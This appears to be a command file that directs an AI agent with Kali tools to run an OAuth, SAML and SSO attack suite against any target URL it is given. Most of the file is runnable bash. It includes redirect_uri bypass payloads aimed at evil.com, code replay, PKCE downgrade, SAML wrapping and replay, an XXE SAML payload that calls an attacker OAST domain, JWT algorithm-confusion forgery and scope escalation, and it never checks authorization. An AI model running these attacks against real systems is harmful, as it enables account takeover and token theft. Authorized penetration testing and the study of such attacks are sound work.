---
description: OAuth 2.0 / SAML / SSO attack suite — authorization code injection, redirect_uri bypass, PKCE downgrade, SAML signature wrapping, OIDC token confusion
argument-hint: <target-base-url> [auth-token]
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
---

# pt-oauth — OAuth 2.0 / SAML / SSO Attack Suite

You are a senior penetration tester specializing in identity and authentication attacks. OAuth bugs pay $5k–$50k on bug bounty programs because they often lead to complete account takeover across every user.

**Before running**: Identify the OAuth/SSO provider in use — check network traffic, JS bundles, and login page HTML for `client_id`, `authorize` endpoints, SAML assertions, or OIDC metadata.

```bash
ENG=/home/kali/current
BASE_URL="$ARGUMENTS"
BASE_URL="${BASE_URL%% *}"  # first word = URL
TOKEN="${ARGUMENTS#* }"     # second word = token (if present)
[ "$TOKEN" = "$ARGUMENTS" ] && TOKEN=""

echo "=== pt-oauth: OAuth / SAML / SSO Attack Suite ==="
echo "Target: $BASE_URL"
echo ""

# Fingerprint: OAuth/OIDC discovery endpoints
echo "=== OAuth Discovery ==="
for path in \
    "/.well-known/openid-configuration" \
    "/.well-known/oauth-authorization-server" \
    "/oauth/.well-known/openid-configuration" \
    "/auth/.well-known/openid-configuration" \
    "/api/.well-known/openid-configuration" \
    "/.well-known/jwks.json" \
    "/oauth/authorize" \
    "/oauth/token" \
    "/api/oauth/authorize" \
    "/auth/authorize" \
    "/connect/authorize" \
    "/saml/metadata" \
    "/saml2/metadata" \
    "/sso/saml" \
    "/auth/saml"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$path" --max-time 5 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] $BASE_URL$path"
done

echo ""
echo "=== JWKS Endpoint ==="
curl -sk "$BASE_URL/.well-known/jwks.json" 2>/dev/null | head -30
curl -sk "$BASE_URL/.well-known/openid-configuration" 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E '"authorization_endpoint|token_endpoint|jwks_uri|issuer|userinfo_endpoint"' | head -10
```

---

## Phase 1 — OAuth Authorization Code Flow Attacks

### Phase 1a — Redirect URI Bypass

**Why**: If the `redirect_uri` validation is weak, attacker steals the authorization code by redirecting to their domain and capturing the code in Referer or server logs.

```bash
BASE_URL=<base_url>
CLIENT_ID=<client_id_from_js_or_network>   # e.g. extracted from login page source
OAST="<your_oast_domain>"                  # from interactsh or webhook.site

echo "=== Phase 1a: redirect_uri Bypass ==="

# Known working redirect URI (extract from login flow first)
LEGIT_REDIRECT="<legit_redirect_uri>"  # e.g. https://target.com/oauth/callback

# Pattern 1: Path traversal in redirect_uri
for bypass in \
    "${LEGIT_REDIRECT}/../../../evil.com" \
    "${LEGIT_REDIRECT}%2F..%2F..%2Fevil.com" \
    "${LEGIT_REDIRECT}@evil.com" \
    "${LEGIT_REDIRECT}%40evil.com" \
    "${LEGIT_REDIRECT}?x=evil.com" \
    "https://evil.com" \
    "https://evil.com.${BASE_URL#https://}" \
    "https://${BASE_URL#https://}.evil.com" \
    "${LEGIT_REDIRECT}evil" \
    "${LEGIT_REDIRECT//callback/callback/../evil}"; do

    URL="$BASE_URL/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$bypass'))")"
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$URL" --max-time 5 2>/dev/null)
    LOCATION=$(curl -sk -D - -o /dev/null "$URL" --max-time 5 2>/dev/null | grep -i "^location:" | head -1)
    echo "  redirect_uri=$bypass → HTTP $CODE | $LOCATION"
done
```

### Phase 1b — State Parameter CSRF (Missing or Predictable State)

```bash
BASE_URL=<base_url>
CLIENT_ID=<client_id>

echo "=== Phase 1b: OAuth State CSRF ==="

# Test 1: Is state parameter required?
URL_NO_STATE="$BASE_URL/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT"
CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$URL_NO_STATE" --max-time 5 2>/dev/null)
echo "  No state param → HTTP $CODE (if 200/302 and no error = state not enforced)"

# Test 2: Predictable state (sequential, timestamp-based)
for state in "1" "2" "12345" "$(date +%s)" "abc" "000000" "state"; do
    URL="$BASE_URL/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT&state=$state"
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$URL" --max-time 5 2>/dev/null)
    echo "  state=$state → HTTP $CODE"
done

echo ""
echo "Exploit: If state not validated, craft CSRF:"
echo "  <img src='$BASE_URL/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT&state=attacker'>"
echo "  When victim clicks: their auth code bound to attacker's state → attacker logs in as victim"
```

### Phase 1c — Authorization Code Replay & Injection

```bash
BASE_URL=<base_url>
TOKEN_ENDPOINT="$BASE_URL/oauth/token"
CLIENT_ID=<client_id>
CLIENT_SECRET=<client_secret_if_known>
LEGIT_REDIRECT=<redirect_uri>
STOLEN_CODE=<code_from_intercept>

echo "=== Phase 1c: Authorization Code Attacks ==="

# Test 1: Code reuse (code should be single-use)
echo "--- Code reuse test ---"
echo "Step 1: Exchange code normally (use browser flow)"
echo "Step 2: Re-submit the same code to token endpoint:"
curl -sk -X POST "$TOKEN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=$STOLEN_CODE&redirect_uri=$LEGIT_REDIRECT&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET" \
    2>/dev/null | python3 -m json.tool | head -15

# Test 2: Code injection — submit another user's code in your own token request
echo ""
echo "--- Cross-user code injection ---"
echo "  If state not bound to session, submit victim's code in your own token exchange"
echo "  victim's code: obtain via CSRF (Phase 1b) or clickjacking"
```

### Phase 1d — PKCE Downgrade Attack

```bash
BASE_URL=<base_url>
CLIENT_ID=<client_id>
LEGIT_REDIRECT=<redirect_uri>

echo "=== Phase 1d: PKCE Downgrade ==="

# Test: Does server require PKCE? Can we send auth request without code_challenge?
URL_NO_PKCE="$BASE_URL/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT"
CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$URL_NO_PKCE" --max-time 5 2>/dev/null)
echo "  No code_challenge → HTTP $CODE"

# Test: Send with PKCE but exchange without verifier
CODE_VERIFIER="dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"  # 43-char random string
CODE_CHALLENGE=$(echo -n "$CODE_VERIFIER" | sha256sum | xxd -r -p | base64 | tr '+/' '-_' | tr -d '=')
URL_WITH_PKCE="$BASE_URL/oauth/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT&code_challenge=$CODE_CHALLENGE&code_challenge_method=S256"
echo "  With PKCE challenge → $URL_WITH_PKCE"
echo "  Exchange token WITHOUT verifier = downgrade attack"
```

---

## Phase 2 — OAuth Token Theft Patterns

```bash
BASE_URL=<base_url>
TOKEN_ENDPOINT="$BASE_URL/oauth/token"

echo "=== Phase 2: Token Theft & Leakage ==="

echo "--- Implicit flow (token in URL fragment) ---"
# If implicit flow allowed: token is in #fragment → visible in Referer header
URL_IMPLICIT="$BASE_URL/oauth/authorize?response_type=token&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT"
CODE=$(curl -sk -D - -o /dev/null "$URL_IMPLICIT" --max-time 5 2>/dev/null | grep -i "location:" | head -1)
echo "  Implicit flow: $CODE"
echo "  (token in fragment visible to third-party resources loaded on the callback page)"

echo ""
echo "--- Token leakage via Referer ---"
echo "  If callback page loads third-party resources (analytics, fonts, images)"
echo "  → access_token in URL fragment leaked in Referer header to those origins"
echo "  Check callback page source for external script/image loads:"
CALLBACK_BODY=$(curl -sk "$LEGIT_REDIRECT" 2>/dev/null | grep -oE 'src="https://[^"]+"|href="https://[^"]+"' | grep -v "${BASE_URL#https://}" | head -10)
[ -n "$CALLBACK_BODY" ] && echo "  Third-party resources on callback page:" && echo "$CALLBACK_BODY"

echo ""
echo "--- Token in history/log ---"
echo "  Check if access_token appears in URL (should be in POST body, not GET params)"
curl -sk "$BASE_URL/api/auth?access_token=test" -o /dev/null -w "%{http_code}" 2>/dev/null | grep -q "200\|401" && echo "  [SIGNAL] access_token accepted in URL param — leaks to server access logs"

echo ""
echo "--- Client credentials in JS bundle ---"
ENG=/home/kali/current
if [ -d "$ENG/recon/http/js" ]; then
    grep -rh "client_secret\|clientSecret\|OAUTH_SECRET\|APP_SECRET" "$ENG/recon/http/js/" 2>/dev/null | \
        grep -v "^//" | grep -v "XXXX\|YOUR_\|REPLACE\|example" | head -10
fi
```

---

## Phase 3 — SAML Attacks

**Trigger**: SSO login button, `/saml/`, `/sso/`, SAML assertion in network traffic (base64 `PHNhbWw...`), `/auth/saml/metadata`.

```bash
BASE_URL=<base_url>
ENG=/home/kali/current

echo "=== Phase 3: SAML Attacks ==="

echo "--- SAML metadata discovery ---"
for path in /saml/metadata /saml2/metadata /sso/metadata /auth/saml /api/saml/metadata /metadata; do
    CODE=$(curl -sk -o /tmp/saml_meta.xml -w "%{http_code}" "$BASE_URL$path" --max-time 5 2>/dev/null)
    if [ "$CODE" = "200" ]; then
        echo "  [METADATA] $BASE_URL$path → $CODE"
        grep -oE 'entityID="[^"]*"|Location="[^"]*"' /tmp/saml_meta.xml | head -5
    fi
done

echo ""
echo "--- SAML response analysis ---"
echo "To capture a SAML assertion: use Burp to intercept the POST to the SP ACS endpoint"
echo "The SAMLResponse parameter is base64-encoded XML"
echo ""
echo "Decode captured assertion:"
echo "  echo '<base64_saml_response>' | base64 -d | xmllint --format - 2>/dev/null | head -50"
echo ""
echo "Key fields to look for:"
echo "  <saml:NameID> — the user identifier (try changing to admin email)"
echo "  <Conditions NotBefore= NotOnOrAfter=> — replay window"
echo "  <ds:Signature> — signature scope (does it cover the whole assertion?)"
echo "  <saml:Attribute Name='role'> — privilege attributes"
```

### Phase 3a — SAML Signature Wrapping

```bash
# After capturing a valid SAML assertion, attempt signature wrapping:
# 1. Decode the base64 SAMLResponse
# 2. The signature covers element with ID="signed_element"
# 3. Inject a NEW unsigned element BEFORE the signed one with malicious NameID
# 4. Parser processes new element (not covered by signature); signature validator processes original (valid)

echo "=== Phase 3a: SAML Signature Wrapping ==="

SAML_B64="<paste_base64_saml_response_here>"

# Decode and analyze
echo "$SAML_B64" | base64 -d 2>/dev/null | python3 - << 'PYEOF'
import sys
data = sys.stdin.read()
print("=== SAML assertion structure ===")
import re
# Find signed element ID
ids = re.findall(r'ID="([^"]+)"', data)
print(f"Element IDs (signature covers these): {ids}")
# Find NameID
name_ids = re.findall(r'<[^>]*NameID[^>]*>([^<]+)<', data)
print(f"NameID values: {name_ids}")
# Find attributes
attrs = re.findall(r'AttributeName="([^"]+)"[^>]*>[^<]*<[^>]*AttributeValue[^>]*>([^<]+)', data)
for attr in attrs: print(f"  Attribute: {attr[0]} = {attr[1]}")
# Expiry
expiry = re.findall(r'NotOnOrAfter="([^"]+)"', data)
print(f"Assertion validity: {expiry}")
PYEOF

echo ""
echo "Wrapping attack: Insert unsigned element with NameID=admin@target.com before signed element"
echo "Tool: saml-raider Burp plugin or manual XML manipulation"
echo "Reference: https://portswigger.net/web-security/xxe/lab-xxe-via-saml"
```

### Phase 3b — SAML Replay Attack

```bash
SAML_ACS="$BASE_URL/saml/acs"  # Assertion Consumer Service URL
SAML_B64="<captured_valid_assertion>"

echo "=== Phase 3b: SAML Replay ==="
echo "Replaying previously captured valid assertion to ACS endpoint..."
RESP=$(curl -sk -X POST "$SAML_ACS" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "SAMLResponse=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SAML_B64'))")" \
    -D - 2>/dev/null | head -20)
echo "$RESP" | grep -E "HTTP|location:|set-cookie:" -i | head -5
echo "If successful (200/redirect to app) = no NotOnOrAfter enforcement or no assertion ID tracking"
```

### Phase 3c — XXE in SAML

```bash
echo "=== Phase 3c: XXE in SAML Assertion ==="
# SAML responses are XML — if the SP parses with XXE enabled, inject entity
# Inject DOCTYPE with external entity into the SAMLResponse before base64 encoding

XXE_SAML=$(cat << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<your_oast_domain>/saml-xxe">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
XMLEOF
)

XXE_B64=$(echo "$XXE_SAML" | base64 | tr -d '\n')
curl -sk -X POST "$BASE_URL/saml/acs" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "SAMLResponse=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.stdin.read().strip()))" <<< "$XXE_B64")" \
    -o /tmp/saml_xxe_resp.txt -w "%{http_code}" 2>/dev/null
echo ""
echo "Check OAST callbacks for XXE trigger"
```

---

## Phase 4 — OIDC Token Confusion

```bash
BASE_URL=<base_url>
TOKEN=<your_id_token>
ACCESS_TOKEN=<your_access_token>

echo "=== Phase 4: OIDC Token Confusion ==="

echo "--- ID token used as access token ---"
# If API accepts ID token where access token expected
for endpoint in "/api/me" "/api/profile" "/api/user" "/api/v1/me" "/userinfo"; do
    RESP=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null | head -5)
    echo "  ID token on $endpoint: $RESP"
done

echo ""
echo "--- aud claim not verified ---"
# Decode the ID token and check 'aud' claim
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E '"aud|iss|sub|exp|email"'
echo ""
echo "  If aud = client_A and you submit this token to client_B's API = confusion attack"

echo ""
echo "--- Signing key confusion (RS256 → HS256) ---"
# If server uses RS256 but also accepts HS256, forge token using public key as HMAC secret
python3 /opt/jwt_tool/jwt_tool.py "$TOKEN" -X k -pk /tmp/public.pem 2>/dev/null | head -10
```

---

## Phase 5 — OAuth Scope & Permission Escalation

```bash
BASE_URL=<base_url>
TOKEN_ENDPOINT="$BASE_URL/oauth/token"
CLIENT_ID=<client_id>
CLIENT_SECRET=<client_secret>

echo "=== Phase 5: Scope Escalation ==="

echo "--- Request elevated scopes ---"
for scope in \
    "admin" \
    "openid profile email admin" \
    "read write delete" \
    "user:admin" \
    "sudo" \
    "superuser" \
    "internal" \
    "all" \
    "api:full" \
    "offline_access admin"; do

    RESP=$(curl -sk -X POST "$TOKEN_ENDPOINT" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials&client_id=$CLIENT_ID&client_secret=$CLIENT_SECRET&scope=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$scope'))")" \
        2>/dev/null)
    GRANTED=$(echo "$RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('scope',''))" 2>/dev/null)
    echo "  Requested: $scope → Granted: $GRANTED"
done

echo ""
echo "--- Client credentials acting as user ---"
# Some apps allow client_credentials grant to impersonate users
curl -sk -X POST "$TOKEN_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"grant_type\":\"client_credentials\",\"client_id\":\"$CLIENT_ID\",\"client_secret\":\"$CLIENT_SECRET\",\"username\":\"admin@target.com\"}" \
    2>/dev/null | python3 -m json.tool | head -10
```

---

## Phase 6 — Token Leakage & Exfiltration Chains

```bash
BASE_URL=<base_url>
ENG=/home/kali/current

echo "=== Phase 6: Token Leakage Patterns ==="

echo "--- Check for open redirect on OAuth callback domain ---"
# If there's an open redirect on the client domain, chain with redirect_uri:
# redirect_uri=https://target.com/callback?next=https://evil.com
# → OAuth sends code to target.com/callback → target redirects to evil.com with code in Referer
for path in /callback /oauth/callback /auth/callback /login/callback; do
    for param in next return redirect url; do
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
            "$BASE_URL$path?$param=https://evil.com" --max-time 5 2>/dev/null)
        LOC=$(curl -sk -D - -o /dev/null "$BASE_URL$path?$param=https://evil.com" \
            --max-time 5 2>/dev/null | grep -i "^location:" | head -1)
        echo "$LOC" | grep -q "evil.com" && echo "  [OPEN REDIRECT] $path?$param= → $LOC"
    done
done

echo ""
echo "--- postMessage token leakage (in-browser) ---"
echo "Check JS for: window.parent.postMessage, window.opener.postMessage"
if [ -d "$ENG/recon/http/js" ]; then
    grep -rhn "postMessage\|window\.opener\|window\.parent" "$ENG/recon/http/js/" 2>/dev/null | \
        grep -v "//.*postMessage" | head -15
fi

echo ""
echo "--- Mixed-up receiver attack ---"
echo "If multiple OAuth clients share same auth server:"
echo "  Client A obtains code for client_id=clientA"
echo "  Submit code to client B's token endpoint with client_id=clientB"
echo "  If server doesn't validate client binding → cross-app token theft"
```

---

## Phase 7 — Save Findings

```bash
ENG=/home/kali/current

echo "=== pt-oauth: Summary ==="
echo ""
echo "Document any finding:"
echo ""
echo "  cat >> $ENG/notes/engagement.md << 'EOF'"
echo "  ## Finding: OAuth redirect_uri Bypass"
echo "  **Severity**: High"
echo "  **CVSS**: 8.1 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
echo "  **Endpoint**: GET /oauth/authorize"
echo "  **Impact**: Authorization code stolen → full account takeover for any user"
echo "  **Evidence**: redirect_uri=https://target.com/callback%2F..%2F..%2Fevil.com accepted"
echo "  **Fix**: Exact match redirect_uri against pre-registered list, reject partial matches"
echo "  EOF"
```

---

## CVSS Reference for OAuth/SAML Findings

| Finding | CVSS | Vector |
|---------|------|--------|
| redirect_uri bypass → ATO | 8.1 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| SAML signature wrapping | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| SAML replay | 8.1 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| OAuth state CSRF | 6.3 | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N |
| Implicit flow token theft | 6.8 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| Client secret in JS | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| PKCE downgrade | 6.8 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N |
| XXE in SAML | 8.6 | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N |

---

## Expert Notes

**OAuth is a protocol, not a standard implementation**: Every app implements it differently. The spec allows many optional security features (PKCE, state, exact-match redirect_uri) that vendors skip. Always check: Is state validated? Is redirect_uri exact-matched or pattern-matched? Is PKCE required?

**Redirect URI bypass most impactful combo**: Open redirect on callback domain + OAuth code in URL = code theft via Referer header. Classic chain. Test: (1) does `/callback?next=evil.com` redirect? (2) does the callback page load third-party resources? Both together = RCE-equivalent bounty on OAuth flows.

**SAML is XML**: All XML parser vulnerabilities apply (XXE, entity expansion, signature wrapping). The signature wrapping attack exploits the difference between what the signature validator sees vs what the application parser processes. Different element IDs = different elements validated vs consumed.

**For OIDC**: The `aud` claim must be validated by every resource server. If `client_A` issues a token and `api_B` accepts it without checking `aud`, that's a cross-service token confusion attack.
